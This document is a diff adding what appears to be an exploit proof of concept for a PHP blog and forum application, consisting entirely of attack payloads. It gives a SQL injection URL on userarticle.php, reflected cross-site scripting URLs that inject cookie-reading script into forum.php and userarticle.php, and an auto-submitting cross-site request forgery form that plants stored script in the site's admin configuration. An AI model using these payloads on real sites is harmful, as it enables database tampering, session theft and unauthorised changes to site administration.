@@ -1,0 +1,19 @@
+http://www.example.com/userblogs/userarticle.php?blogid=1&start=0'+ANY_SQL_CODE
+
+http://www.example.com/community/forum.php?forum=1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&cat=1
+
+http://www.example.com/userblogs/userarticle.php?blogid=1&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+&lt;form action=&quot;http://www.example.com/admin/configuration/configuretransact.php&quot; method=&quot;post&quot; &gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;sitename&quot; value=&quot;Demo Site&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;url&quot; value=&quot;http://www.example.com/&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;timezone&quot; value=&quot;&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;description&quot; value='descr&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;keyword&quot; value='key&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;' /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;copyright&quot; value=&quot;2010&quot; /&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;status&quot; value=&quot;1&quot; /&gt;
+	&lt;input type=&quot;submit&quot; id=&quot;upd&quot; name=&quot;submit&quot; value=&quot;Update Configuration&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.getElementById('upd').click();
+&lt;/script&gt;
